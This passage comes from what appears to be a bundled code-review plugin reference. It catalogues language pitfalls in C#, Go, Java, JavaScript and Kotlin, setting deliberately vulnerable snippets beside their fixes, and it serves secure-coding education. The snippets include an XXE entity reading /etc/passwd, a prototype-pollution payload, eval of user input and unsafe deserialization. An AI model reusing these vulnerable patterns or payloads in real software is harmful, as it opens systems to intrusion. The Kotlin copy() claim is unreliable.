Unboxing\n\n// DANGEROUS: Interface boxing\nstruct Point : IComparable<Point> { ... }\nIComparable<Point> comparable = point;  // Boxed!\n\n// DANGEROUS: LINQ with value types\nvar ints = new[] { 1, 2, 3 };\nints.Where(x => x > 1);  // Closure may box\n```\n\n## Equality Implementation\n\n```csharp\n// DANGEROUS: Incorrect equality implementation\nclass MyClass {\n    public int Id;\n\n    public override bool Equals(object obj) {\n        return Id == ((MyClass)obj).Id;  // Throws if obj is null or wrong type\n    }\n\n    // DANGEROUS: Missing GetHashCode\n    // Objects that are Equal MUST have same hash code\n    // But: public override int GetHashCode() => ... // Missing!\n}\n```\n\n**Fix**: Implement correctly or use records (C# 9+):\n```csharp\nrecord MyRecord(int Id);  // Equality implemented correctly\n```\n\n## Lock Pitfalls\n\n```csharp\n// DANGEROUS: Locking on public object\npublic object SyncRoot = new object();\nlock (SyncRoot) { }  // External code can deadlock\n\n// DANGEROUS: Locking on this\nlock (this) { }  // External code can lock same object\n\n// DANGEROUS: Locking on Type\nlock (typeof(MyClass)) { }  // Type objects are shared across AppDomains\n\n// DANGEROUS: Locking on string\nlock (\"mylock\") { }  // String interning makes this shared!\n```\n\n**Fix**: Lock on private readonly object:\n```csharp\nprivate readonly object _lock = new object();\nlock (_lock) { }\n```\n\n## Finalizers\n\n```csharp\n// DANGEROUS: Finalizer delays GC and can resurrect objects\nclass Problematic {\n    ~Problematic() {\n        // This code runs on finalizer thread\n        // Can't access other managed objects safely\n        GlobalList.Add(this);  // Resurrection!\n    }\n}\n\n// DANGEROUS: Finalizer without dispose pattern\n// Object stays in memory longer (finalization queue)\n```\n\n**Fix**: Implement dispose pattern, avoid finalizers:\n```csharp\nclass Proper : IDisposable {\n    private bool _disposed;\n\n    public void Dispose() {\n        Dispose(true);\n        GC.SuppressFinalize(this);\n    }\n\n    protected virtual void Dispose(bool disposing) {\n        if (_disposed) return;\n        if (disposing) { /* managed cleanup */ }\n        // unmanaged cleanup\n        _disposed = true;\n    }\n}\n```\n\n## Event Handler Memory Leaks\n\n```csharp\n// DANGEROUS: Event handlers keep objects alive\nclass Publisher {\n    public event EventHandler Changed;\n}\n\nclass Subscriber {\n    public Subscriber(Publisher pub) {\n        pub.Changed += OnChanged;  // Subscriber now rooted by Publisher\n        // Even if Subscriber should be collected, it won't be\n    }\n}\n```\n\n**Fix**: Unsubscribe in Dispose or use weak events.\n\n## Serialization\n\n```csharp\n// DANGEROUS: BinaryFormatter is insecure\nvar formatter = new BinaryFormatter();\nformatter.Deserialize(untrustedStream);  // RCE vulnerability\n\n// Microsoft: \"BinaryFormatter is dangerous and is not recommended\"\n// Similar issues with NetDataContractSerializer, SoapFormatter\n```\n\n**Fix**: Use JSON, XML with known types, or protobuf.\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `string? x = null; string y = x;` | NRT warning ignored |\n| `possiblyNull!` | Null suppression |\n| `new Connection[n]` for structs | Invalid default state |\n| `SqlConnection` without `using` | Resource leak |\n| `async void` | Unhandled exceptions |\n| `.Result` or `.Wait()` on Task | Deadlock |\n| Missing `await` before async call | Fire and forget |\n| `.Where()` without materialization | Multiple enumeration |\n| `string.Equals` without StringComparison | Culture bugs |\n| `lock (this)` or `lock (typeof(...))` | Deadlock risk |\n| `BinaryFormatter` | Deserialization RCE |\n| Event subscription without unsubscription | Memory leak |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-go.md": "# Go Sharp Edges\n\n## Silent Integer Overflow\n\n```go\n// DANGEROUS: Overflow wraps silently (no panic!)\nvar x int32 = math.MaxInt32\nx = x + 1  // Wraps to -2147483648, no error\n\n// Real vulnerability pattern: size calculations\nfunc allocate(count int32, size int32) []byte {\n    total := count * size  // Can overflow!\n    return make([]byte, total)  // Tiny allocation\n}\n```\n\n**The Problem**: Unlike Rust (debug panics), Go silently wraps. Fuzzing with go-fuzz may never find overflow bugs because they don't crash.\n\n**Detection**: Arithmetic on integer types, especially:\n- Multiplication for size calculations\n- Addition near max values\n- Conversions between integer sizes\n\n**Mitigation**: Use `math/bits` overflow-checking functions or check manually.\n\n## Slice Aliasing\n\n```go\n// DANGEROUS: Slices share backing array\noriginal := []int{1, 2, 3, 4, 5}\nslice1 := original[1:3]  // {2, 3}\nslice2 := original[2:4]  // {3, 4}\n\nslice1[1] = 999  // Modifies original AND slice2!\n// slice2 is now {999, 4}\n// original is now {1, 2, 999, 4, 5}\n\n// Also dangerous with append:\na := []int{1, 2, 3}\nb := a[:2]         // Shares backing array\nb = append(b, 4)   // May or may not reallocate\n// Did this modify a[2]? Depends on capacity!\n```\n\n**Fix**: Use `copy()` to create independent slices when needed.\n\n## Interface Nil Confusion\n\n```go\n// DANGEROUS: Typed nil vs untyped nil\nvar p *MyStruct = nil\nvar i interface{} = p\n\nif i == nil {\n    // This is FALSE!\n    // i holds (type=*MyStruct, value=nil)\n    // An interface is only nil if BOTH type AND value are nil\n}\n\n// Common in error handling:\nfunc getError() error {\n    var err *MyError = nil\n    return err  // Returns non-nil error interface!\n}\n\nif err := getError(); err != nil {\n    // Always true! Even though underlying pointer is nil\n}\n```\n\n**Fix**: Return explicit `nil`, not typed nil pointers.\n\n```go\nfunc getError() error {\n    if somethingWrong {\n        return &MyError{}\n    }\n    return nil  // Untyped nil - interface will be nil\n}\n```\n\n## JSON Decoder Pitfalls\n\n```go\n// DANGEROUS: Case-insensitive field matching\ntype User struct {\n    Admin bool `json:\"admin\"`\n}\n\n// Attacker sends: {\"ADMIN\": true} or {\"Admin\": true} or {\"aDmIn\": true}\n// ALL match the \"admin\" field!\n\n// DANGEROUS: Duplicate keys - last one wins\n// {\"admin\": false, \"admin\": true}  Admin = true\n// Attacker can hide the true value after a false value\n\n// DANGEROUS: Unknown fields silently ignored\ntype Config struct {\n    Timeout int `json:\"timeout\"`\n}\n// {\"timeout\": 30, \"timeoutt\": 0} - typo silently ignored\n```\n\n**Fix**:\n```go\ndecoder := json.NewDecoder(r.Body)\ndecoder.DisallowUnknownFields()  // Reject unknown fields\n```\n\nFor case-sensitivity, consider alternative JSON libraries or custom UnmarshalJSON.\n\n## Defer in Loops\n\n```go\n// DANGEROUS: All defers execute at function end, not loop iteration\nfunc processFiles(files []string) error {\n    for _, file := range files {\n        f, err := os.Open(file)\n        if err != nil {\n            return err\n        }\n        defer f.Close()  // Files stay open until function returns!\n    }\n    // All files open simultaneously - can exhaust file descriptors\n    return nil\n}\n\n// SAFE: Use closure to scope defer\nfunc processFiles(files []string) error {\n    for _, file := range files {\n        if err := func() error {\n            f, err := os.Open(file)\n            if err != nil {\n                return err\n            }\n            defer f.Close()  // Closes at end of this closure\n            return processFile(f)\n        }(); err != nil {\n            return err\n        }\n    }\n    return nil\n}\n```\n\n## Goroutine Leaks\n\n```go\n// DANGEROUS: Goroutine blocked forever\nfunc search(query string) string {\n    ch := make(chan string)\n    go func() {\n        ch <- slowSearch(query)  // What if nobody reads?\n    }()\n\n    select {\n    case result := <-ch:\n        return result\n    case <-time.After(100 * time.Millisecond):\n        return \"\"  // Timeout - goroutine blocked forever!\n    }\n}\n\n// SAFE: Use buffered channel\nfunc search(query string) string {\n    ch := make(chan string, 1)  // Buffered - send won't block\n    go func() {\n        ch <- slowSearch(query)\n    }()\n\n    select {\n    case result := <-ch:\n        return result\n    case <-time.After(100 * time.Millisecond):\n        return \"\"  // Goroutine can still send and exit\n    }\n}\n```\n\n## Range Loop Variable Capture\n\n```go\n// DANGEROUS (Go < 1.22): Loop variable captured by reference\nvar funcs []func()\nfor _, v := range []int{1, 2, 3} {\n    funcs = append(funcs, func() { fmt.Println(v) })\n}\nfor _, f := range funcs {\n    f()  // Prints: 3, 3, 3 (all capture same v)\n}\n\n// SAFE: Copy the variable\nfor _, v := range []int{1, 2, 3} {\n    v := v  // Shadow with new variable\n    funcs = append(funcs, func() { fmt.Println(v) })\n}\n```\n\n**Note**: Fixed in Go 1.22 with GOEXPERIMENT=loopvar (default in Go 1.23+).\n\n## String/Byte Slice Conversion\n\n```go\n// DANGEROUS: String to []byte creates a copy\ns := \"large string...\"\nb := []byte(s)  // Allocates and copies\n\n// In hot paths, this can be expensive\n// But unsafe conversion has its own risks:\n\n// VERY DANGEROUS: Unsafe conversion allows mutation\nimport \"unsafe\"\ns := \"immutable\"\nb := *(*[]byte)(unsafe.Pointer(&s))\nb[0] = 'X'  // Modifies \"immutable\" string - UB!\n// Strings are supposed to be immutable\n```\n\n## Map Concurrent Access\n\n```go\n// DANGEROUS: Maps are not goroutine-safe\nm := make(map[string]int)\n\ngo func() { m[\"a\"] = 1 }()\ngo func() { m[\"b\"] = 2 }()\n// Data race! Can cause runtime panic or corruption\n\n// SAFE: Use sync.Map or mutex\nvar m sync.Map\nm.Store(\"a\", 1)\n```\n\n## Error Handling Patterns\n\n```go\n// DANGEROUS: Ignoring errors\ndata, _ := ioutil.ReadFile(filename)  // Error ignored!\n\n// DANGEROUS: Error shadowing\nerr := doSomething()\nif err != nil {\n    err := handleError(err)  // Shadows outer err!\n    // Original err handling may be skipped\n}\n\n// DANGEROUS: Deferred error ignoring\ndefer file.Close()  // Close() returns error, ignored!\n\n// SAFER:\ndefer func() {\n    if err := file.Close(); err != nil {\n        log.Printf(\"close failed: %v\", err)\n    }\n}()\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `x * y` with int types | Silent overflow |\n| `slice[a:b]` without copy | Aliasing |\n| `return &ConcreteType{}` as interface | Interface nil confusion |\n| `json.Unmarshal` without DisallowUnknownFields | Field injection |\n| `defer` inside `for` | Resource leak |\n| `go func()` with unbuffered channel | Goroutine leak |\n| Closure in loop capturing loop var | Capture bug (pre-1.22) |\n| `map` access from multiple goroutines | Data race |\n| `_, err :=` instead of `_, err =` | Error shadowing |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-java.md": "# Java Sharp Edges\n\n## Equality Confusion\n\n```java\n// DANGEROUS: == compares references, not values\nString a = new String(\"hello\");\nString b = new String(\"hello\");\na == b  // FALSE - different objects\n\n// String interning makes this confusing:\nString c = \"hello\";\nString d = \"hello\";\nc == d  // TRUE - string literals are interned\n\n// DANGEROUS: Integer caching boundary\nInteger x = 127;\nInteger y = 127;\nx == y  // TRUE - cached in range [-128, 127]\n\nInteger p = 128;\nInteger q = 128;\np == q  // FALSE - outside cache range!\n```\n\n**Fix**: Always use `.equals()` for object comparison:\n```java\na.equals(b)  // TRUE\np.equals(q)  // TRUE\nObjects.equals(a, b)  // Null-safe\n```\n\n## Type Erasure\n\n```java\n// DANGEROUS: Generic types erased at runtime\nList<String> strings = new ArrayList<>();\nList<Integer> ints = new ArrayList<>();\n\n// At runtime, both are just \"ArrayList\"\nstrings.getClass() == ints.getClass()  // TRUE\n\n// Can't do runtime type checks:\nif (obj instanceof List<String>) { }  // Compile error!\n\n// Can cast incorrectly:\nList<?> raw = strings;\nList<Integer> wrongType = (List<Integer>) raw;  // No runtime error!\nwrongType.get(0);  // ClassCastException here, not at cast\n```\n\n## Serialization RCE\n\n```java\n// DANGEROUS: Like pickle, deserializes arbitrary objects\nObjectInputStream ois = new ObjectInputStream(untrustedInput);\nObject obj = ois.readObject();\n\n// Even without reading, deserialization triggers:\n// - readObject() methods\n// - readResolve() methods\n// - finalize() (deprecated but still works)\n\n// \"Gadget chains\" in libraries enable RCE:\n// - Commons Collections\n// - Spring Framework\n// - Apache libraries\n// ysoserial tool generates payloads\n```\n\n**Fix**: Use JSON or implement `ObjectInputFilter` (Java 9+):\n```java\nObjectInputFilter filter = ObjectInputFilter.Config.createFilter(\n    \"!*\"  // Reject all classes\n);\n```\n\n## Null Pointer Exceptions\n\n```java\n// DANGEROUS: Unboxing null throws NPE\nInteger value = null;\nint primitive = value;  // NPE!\n\n// DANGEROUS: Chained calls\nString name = user.getProfile().getSettings().getName();\n// NPE if any intermediate is null\n\n// Optional doesn't help if misused:\nOptional.of(null);  // NPE!\noptional.get();     // NoSuchElementException if empty\n```\n\n**Fix**: Use Optional correctly:\n```java\nOptional.ofNullable(value);\noptional.orElse(default);\noptional.map(x -> x.transform()).orElse(null);\n```\n\n## Checked Exception Swallowing\n\n```java\n// DANGEROUS: Empty catch blocks\ntry {\n    sensitiveOperation();\n} catch (Exception e) {\n    // Silently swallowed - failure masked!\n}\n\n// DANGEROUS: Catch-and-log without action\ntry {\n    authenticate();\n} catch (AuthException e) {\n    log.error(\"Auth failed\", e);\n    // Continues as if authentication succeeded!\n}\n\n// DANGEROUS: Over-broad catch\ntry {\n    doWork();\n} catch (Exception e) {  // Catches everything including bugs\n    return defaultValue;\n}\n```\n\n## String Operations\n\n```java\n// DANGEROUS: String concatenation in loops\nString result = \"\";\nfor (String s : items) {\n    result += s;  // Creates new String each iteration\n}\n// O(n) time complexity, memory churn\n\n// DANGEROUS: split() with regex\n\"a.b.c\".split(\".\");  // Empty array! \".\" is regex for \"any char\"\n\n// DANGEROUS: substring() memory (pre-Java 7u6)\nString huge = loadGigabyteFile();\nString small = huge.substring(0, 10);\n// small holds reference to entire huge char[]\n```\n\n**Fix**: Use `StringBuilder`, `Pattern.quote(\".\")`, modern Java.\n\n## Thread Safety\n\n```java\n// DANGEROUS: SimpleDateFormat is not thread-safe\nstatic SimpleDateFormat fmt = new SimpleDateFormat(\"yyyy-MM-dd\");\n\n// Multiple threads calling fmt.parse() = corrupted results\n\n// DANGEROUS: HashMap not thread-safe\nMap<String, String> map = new HashMap<>();\n// Concurrent put() can cause infinite loop!\n\n// DANGEROUS: Double-checked locking (broken before Java 5)\nif (instance == null) {\n    synchronized (lock) {\n        if (instance == null) {\n            instance = new Singleton();  // May see partially constructed\n        }\n    }\n}\n```\n\n**Fix**: Use `DateTimeFormatter` (immutable), `ConcurrentHashMap`, volatile.\n\n## Resource Leaks\n\n```java\n// DANGEROUS: Resources not closed on exception\nFileInputStream fis = new FileInputStream(file);\n// Exception here = fis never closed\nprocess(fis);\nfis.close();\n\n// DANGEROUS: Close in finally can mask exception\nFileInputStream fis = null;\ntry {\n    fis = new FileInputStream(file);\n    throw new RuntimeException(\"oops\");\n} finally {\n    fis.close();  // May throw, masking original exception\n}\n```\n\n**Fix**: Use try-with-resources:\n```java\ntry (FileInputStream fis = new FileInputStream(file)) {\n    process(fis);\n}  // Automatically closed, exceptions properly handled\n```\n\n## Floating Point\n\n```java\n// DANGEROUS: Float/double for money\ndouble price = 0.1 + 0.2;  // 0.30000000000000004\nif (price == 0.3) { }  // FALSE!\n\n// DANGEROUS: BigDecimal from double\nnew BigDecimal(0.1);  // 0.1000000000000000055511151231257827...\n```\n\n**Fix**: Use `BigDecimal` with String constructor:\n```java\nnew BigDecimal(\"0.1\");  // Exactly 0.1\n```\n\n## Reflection\n\n```java\n// DANGEROUS: Bypasses access controls\nField field = obj.getClass().getDeclaredField(\"privateField\");\nfield.setAccessible(true);  // Bypass private!\nfield.set(obj, maliciousValue);\n\n// Can modify \"final\" fields (with caveats)\n// Can invoke private methods\n// Can break encapsulation entirely\n```\n\n## XML Processing (XXE)\n\n```java\n// DANGEROUS: Default XML parsers allow XXE\nDocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n// Default allows: <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n\n// DANGEROUS: Even with DTD disabled\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n// Still vulnerable to billion laughs without entity limits\n```\n\n**Fix**: Disable all external entities:\n```java\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nfactory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\nfactory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\nfactory.setXIncludeAware(false);\nfactory.setExpandEntityReferences(false);\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `==` with objects | Reference comparison |\n| `Integer/Long` comparison with `==` | Cache boundary |\n| `ObjectInputStream.readObject()` | Deserialization RCE |\n| Empty `catch` block | Swallowed exception |\n| `catch (Exception e)` | Over-broad catch |\n| `String +=` in loop | Performance, memory |\n| `split(\".\")` | Regex interpretation |\n| `static SimpleDateFormat` | Thread safety |\n| `HashMap` shared across threads | Race condition |\n| Resources without try-with-resources | Resource leak |\n| `new BigDecimal(double)` | Precision loss |\n| `DocumentBuilderFactory.newInstance()` | XXE vulnerability |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-javascript.md": "# JavaScript / TypeScript Sharp Edges\n\n## Loose Equality Coercion\n\n```javascript\n// DANGEROUS: == coerces types unpredictably\n\"0\" == false   // true\n\"\" == false    // true\n\"\" == 0        // true\n[] == false    // true\n[] == ![]      // true (wat)\nnull == undefined  // true\n\n// Security implications:\nif (userRole == \"admin\") {  // What if userRole is 0?\n    grantAdmin();\n}\n0 == \"admin\"  // false, but...\n0 == \"\"       // true\n```\n\n**Fix**: Always use `===` for strict equality.\n\n## Prototype Pollution\n\n```javascript\n// DANGEROUS: Merging untrusted objects\nfunction merge(target, source) {\n    for (let key in source) {\n        target[key] = source[key];  // Includes __proto__!\n    }\n}\n\n// Attacker sends: {\"__proto__\": {\"isAdmin\": true}}\nmerge({}, JSON.parse(userInput));\n\n// Now ALL objects have isAdmin\n({}).isAdmin  // true\nconst user = {};\nuser.isAdmin  // true - authentication bypassed!\n\n// Also via constructor.prototype\n// {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}\n```\n\n**Fix**:\n```javascript\n// Check for dangerous keys\nconst dangerous = ['__proto__', 'constructor', 'prototype'];\nif (dangerous.includes(key)) continue;\n\n// Or use Object.create(null) for dictionary objects\nconst dict = Object.create(null);  // No prototype chain\n\n// Or use Map instead of objects\nconst map = new Map();\n```\n\n## Regular Expression DoS (ReDoS)\n\n```javascript\n// DANGEROUS: Catastrophic backtracking\nconst regex = /^(a+)+$/;\nregex.test(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaa!\");\n// Exponential time - freezes the event loop\n\n// Dangerous patterns:\n// - Nested quantifiers: (a+)+, (a*)*\n// - Overlapping alternatives: (a|a)+\n// - Greedy quantifiers with overlap: .*.*\n\n// Real example from ua-parser-js CVE:\n/\\s*(;|\\s)\\s*/  // Fine\n/(a|aa)+/       // ReDoS!\n```\n\n**Detection**: Look for nested quantifiers or overlapping alternatives in regex.\n\n## parseInt Without Radix\n\n```javascript\n// DANGEROUS: Behavior varies\nparseInt(\"08\");      // 8 (modern JS), was 0 in ES3 (octal)\nparseInt(\"0x10\");    // 16 - hex prefix always recognized\nparseInt(\"10\", 0);   // 10 or error depending on engine\nparseInt(\"10\", 1);   // NaN - radix 1 invalid\n\n// DANGEROUS: Unexpected results\nparseInt(\"123abc\");  // 123 - stops at first non-digit\nparseInt(\"abc123\");  // NaN - starts with non-digit\n```\n\n**Fix**: Always specify radix: `parseInt(\"08\", 10)`\n\n## This Binding\n\n```javascript\n// DANGEROUS: 'this' depends on how function is called\nconst obj = {\n    value: 42,\n    getValue: function() { return this.value; }\n};\n\nobj.getValue();           // 42\nconst fn = obj.getValue;\nfn();                     // undefined - 'this' is global/undefined\n\n// DANGEROUS: In callbacks\nsetTimeout(obj.getValue, 100);  // 'this' is global/undefined\n\n// DANGEROUS: In event handlers\nbutton.addEventListener('click', obj.getValue);  // 'this' is button\n```\n\n**Fix**: Use arrow functions or `.bind()`.\n\n## Array Methods That Mutate\n\n```javascript\n// These MUTATE the original array:\narr.push(x);      // Adds to end\narr.pop();        // Removes from end\narr.shift();      // Removes from start\narr.unshift(x);   // Adds to start\narr.splice(i, n); // Removes/inserts\narr.sort();       // Sorts IN PLACE\narr.reverse();    // Reverses IN PLACE\narr.fill(x);      // Fills IN PLACE\n\n// These return NEW arrays:\narr.slice();\narr.concat();\narr.map();\narr.filter();\n\n// DANGEROUS: Sorting numbers\n[1, 10, 2].sort();  // [1, 10, 2] - string comparison!\n// Fix: [1, 10, 2].sort((a, b) => a - b);  // [1, 2, 10]\n```\n\n## Type Coercion in Operations\n\n```javascript\n// DANGEROUS: + is overloaded for concatenation\n\"5\" + 3     // \"53\" (string)\n5 + \"3\"     // \"53\" (string)\n5 - \"3\"     // 2 (number)\n\"5\" - 3     // 2 (number)\n\n// DANGEROUS: Comparison with type coercion\n\"10\" > \"9\"  // false (string comparison: \"1\" < \"9\")\n\"10\" > 9    // true (numeric comparison)\n```\n\n## eval and Dynamic Code\n\n```javascript\n// DANGEROUS: eval executes arbitrary code\neval(userInput);\n\n// DANGEROUS: Function constructor\nnew Function(userInput)();\n\n// DANGEROUS: setTimeout/setInterval with string\nsetTimeout(userInput, 1000);  // Executes as code!\n\n// DANGEROUS: Template injection\nconst template = userInput;  // \"${process.exit()}\"\neval(`\\`${template}\\``);\n```\n\n## Object Property Access\n\n```javascript\n// DANGEROUS: Bracket notation with user input\nconst obj = { admin: false };\nconst key = userInput;  // Could be \"__proto__\", \"constructor\", etc.\nobj[key] = true;  // Prototype pollution!\n\n// DANGEROUS: in operator checks prototype chain\n\"toString\" in {}  // true - inherited from Object.prototype\n\n// Fix: Use hasOwnProperty\n({}).hasOwnProperty(\"toString\")  // false\nObject.hasOwn({}, \"toString\")    // false (ES2022)\n```\n\n## Async/Await Pitfalls\n\n```javascript\n// DANGEROUS: Unhandled promise rejection\nasync function riskyOperation() {\n    throw new Error(\"oops\");\n}\nriskyOperation();  // Unhandled rejection - may crash Node.js\n\n// DANGEROUS: Missing await\nasync function process() {\n    validateInput();  // Forgot await - validation not complete!\n    doSensitiveOperation();\n}\n\n// DANGEROUS: Sequential when parallel is possible\nasync function slow() {\n    const a = await fetchA();  // Waits\n    const b = await fetchB();  // Then waits\n    return a + b;\n}\n\n// Better: parallel\nasync function fast() {\n    const [a, b] = await Promise.all([fetchA(), fetchB()]);\n    return a + b;\n}\n```\n\n## JSON Parse Issues\n\n```javascript\n// DANGEROUS: __proto__ in JSON\nJSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\n// Creates object with __proto__ key, but doesn't pollute\n\n// However, if merged into another object:\nObject.assign({}, JSON.parse(userInput));\n// Can pollute if userInput has __proto__\n\n// DANGEROUS: Large numbers lose precision\nJSON.parse('{\"id\": 9007199254740993}');\n// id becomes 9007199254740992 (precision loss)\n```\n\n## TypeScript-Specific\n\n```typescript\n// DANGEROUS: Type assertions bypass checking\nconst user = userData as Admin;  // No runtime check!\nuser.adminMethod();  // Runtime error if not actually Admin\n\n// DANGEROUS: any escapes type system\nfunction process(data: any) {\n    data.whatever();  // No type checking\n}\n\n// DANGEROUS: Non-null assertion\nfunction greet(name: string | null) {\n    console.log(name!.toUpperCase());  // Crash if null!\n}\n\n// DANGEROUS: Type guards can lie\nfunction isAdmin(user: User): user is Admin {\n    return true;  // Wrong! TypeScript trusts this\n}\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| `==` instead of `===` | Type coercion bugs |\n| `obj[userInput]` | Prototype pollution |\n| `/__proto__|constructor|prototype/` in merge | Pollution vectors |\n| `(a+)+`, `(.*)+` in regex | ReDoS |\n| `parseInt(x)` without radix | Parsing inconsistency |\n| `eval(`, `Function(`, `setTimeout(string` | Code execution |\n| `.sort()` on numbers without comparator | String sort |\n| `as Type` assertions | Runtime type mismatch |\n| `!` non-null assertion | Null pointer crash |\n| Missing `await` before async call | Race condition |\n",
        "plugins/sharp-edges/skills/sharp-edges/references/lang-kotlin.md": "# Kotlin Sharp Edges\n\n## Platform Types from Java\n\n```kotlin\n// DANGEROUS: Java interop returns \"platform types\" (Type!)\nval result = javaLibrary.getValue()  // Type: String! (platform type)\nresult.length  // NPE if Java returned null!\n\n// Kotlin doesn't know if Java code can return null\n// Platform types bypass null safety\n\n// Even \"safe\" Java annotations may not be recognized:\n// @NotNull in Java doesn't guarantee Kotlin sees it correctly\n```\n\n**Fix**: Explicitly declare nullability when calling Java:\n```kotlin\nval result: String? = javaLibrary.getValue()  // Treat as nullable\nval result: String = javaLibrary.getValue()   // Throws if null\n```\n\n## Not-Null Assertion (!!)\n\n```kotlin\n// DANGEROUS: !! throws on null\nval value = nullableValue!!  // KotlinNullPointerException\n\n// Common antipattern:\nval user = findUser(id)!!  // \"I know it's not null\"\n// Famous last words\n\n// DANGEROUS: Chained assertions\nval name = user!!.profile!!.name!!  // Triple jeopardy\n```\n\n**Fix**: Use safe calls and elvis operator:\n```kotlin\nval value = nullableValue ?: return\nval value = nullableValue ?: throw IllegalStateException(\"...\")\nval name = user?.profile?.name ?: \"default\"\n```\n\n## Lateinit\n\n```kotlin\n// DANGEROUS: Accessing before initialization\nclass MyClass {\n    lateinit var config: Config\n\n    fun process() {\n        config.value  // UninitializedPropertyAccessException if not set\n    }\n}\n\n// Can check with ::property.isInitialized but often forgotten\nif (::config.isInitialized) {\n    config.value\n}\n```\n\n**Better alternatives**:\n```kotlin\n// Lazy initialization\nval config: Config by lazy { loadConfig() }\n\n// Nullable with check\nvar config: Config? = null\nfun process() {\n    val c = config ?: throw IllegalStateException(\"Not configured\")\n}\n```\n\n## Data Class Copy Pitfalls\n\n```kotlin\ndata class User(val name: String, val role: Role)\n\n// DANGEROUS: copy() can bypass immutability intentions\nval admin = User(\"Alice\", Role.ADMIN)\nval notAdmin = admin.copy(role = Role.USER)  // Fine\n\n// But if User validates in constructor:\ndata class User(val name: String, val role: Role) {\n    init {\n        require(name.isNotBlank()) { \"Name required\" }\n    }\n}\n\n// copy() BYPASSES the init block in some scenarios\n// Validation may not run on copy\n```\n\n## Companion Object Initialization\n\n```kotlin\n// DANGEROUS: Companion objects initialize lazily on first access\nclass MyClass {\n    companion object {\n        val config = loadConfig()  // When does this run?\n    }\n}\n\n// First access triggers initialization\n// Can cause unexpected delays or errors at runtime\n// Order of initialization across classes is complex\n```\n\n## Coroutine Cancellation\n\n```kotlin\n// DANGEROUS: Not checking for cancellation\nsuspend fun longOperation() {\n    while (true) {\n        heavyComputation()  // Doesn't check cancellation\n    }\n}\n\n// Cancel won't stop this coroutine!\nval job = launch { longOperation() }\njob.cancel()  // Coroutine keeps running\n\n// DANGEROUS: Swallowing CancellationException\nsuspend fun wrapped() {\n    try {\n        suspendingFunction()\n    } catch (e: Exception) {\n        // CancellationException caught! Breaks cancellation\n    }\n}\n```\n\n**Fix**: Check for cancellation and rethrow CancellationException:\n```kotlin\nsuspend fun longOperation() {\n    while (true) {\n        ensureActive()  // or yield()\n        heavyComputation()\n    }\n}\n\ncatch (e: Exception) {\n    if (e is CancellationException) throw e\n    // handle other exceptions\n}\n```\n\n## Inline Class Boxing\n\n```kotlin\n@JvmInline\nvalue class UserId(val id: Int)\n\n// DANGEROUS: Boxing occurs in certain contexts\nfun process(id: UserId?) { }  // Nullable = boxed\nfun process(id: Any) { }      // Any = boxed\nval list: List<UserId>        // Generic = boxed\n\n// Performance benefit lost, but worse:\n// Two \"equal\" values may not be identical\n```\n\n## Scope Functions Confusion\n\n```kotlin\n// DANGEROUS: Wrong scope function leads to bugs\nval user = User()\nuser.also {\n    it.name = \"Alice\"\n}.let {\n    return it.name  // 'it' is the user, 'this' is outer scope\n}\n\n// Easy to confuse:\n// let: it = receiver, returns lambda result\n// also: it = receiver, returns receiver\n// apply: this = receiver, returns receiver\n// run: this = receiver, returns lambda result\n// with: this = receiver, returns lambda result\n```\n\n## Delegation Pitfalls\n\n```kotlin\n// DANGEROUS: Property delegation evaluated lazily\nclass Config {\n    val setting by lazy { loadExpensiveSetting() }\n}\n\n// Thread safety depends on lazy mode:\nby lazy { }                           // Synchronized (safe but slow)\nby lazy(LazyThreadSafetyMode.NONE) { } // Not safe!\nby lazy(LazyThreadSafetyMode.PUBLICATION) { } // Safe but may compute multiple times\n```\n\n## Reified Type Erasure\n\n```kotlin\n// DANGEROUS: Inline + reified still has limits\ninline fun <reified T> parse(json: String): T {\n    return gson.fromJson(json, T::class.java)\n}\n\n// Works for simple types, but:\nparse<List<String>>(json)  // T::class.java is just List, not List<String>\n// Generic type arguments still erased\n```\n\n## Sequence vs Iterable\n\n```kotlin\n// DANGEROUS: Sequences are lazy, Iterables are eager\nval list = listOf(1, 2, 3)\n\n// Eager - filter runs on all elements immediately\nlist.filter { println(\"filter $it\"); it > 1 }\n    .map { println(\"map $it\"); it * 2 }\n    .first()\n// Prints: filter 1, filter 2, filter 3, map 2, map 3\n\n// Lazy - only processes needed elements\nlist.asSequence()\n    .filter { println(\"filter $it\"); it > 1 }\n    .map { println(\"map $it\"); it * 2 }\n    .first()\n// Prints: filter 1, filter 2, map 2\n```\n\nBut sequences can also surprise:\n```kotlin\n// DANGEROUS: Sequence operations return new sequences, not results\nval seq = listOf(1, 2, 3).asSequence()\n    .filter { it > 1 }\n    .map { it * 2 }\n// Nothing executed yet! Must terminate with toList(), first(), etc.\n```\n\n## Extension Function Shadowing\n\n```kotlin\n// DANGEROUS: Extension functions can shadow members\nclass MyClass {\n    fun process() = \"member\"\n}\n\nfun MyClass.process() = \"extension\"  // Never called!\n\nval obj = MyClass()\nobj.process()  // \"member\" - members always win\n```\n\n## Detection Patterns\n\n| Pattern | Risk |\n|---------|------|\n| Java interop without explicit nullability | Platform type NPE |\n| `!!` assertion | Null pointer exception |\n| `lateinit` without isInitialized check | Uninitialized access |\n| `data class` with validation in init | copy() bypasses validation |\n| `suspend fun` without ensureActive/yield | Can't cancel |\n| `catch (e: Exception)` in coroutines | Swallows cancellation |\n| `@JvmInline` with nullable/generic | Unexpected boxing |\n| `by lazy(LazyThreadSafetyMode.NONE)` | Thread safety |\n| `asSequence()` without terminal op | Nothing executes |\n| Extension function same name as member | Extension never called |\n",
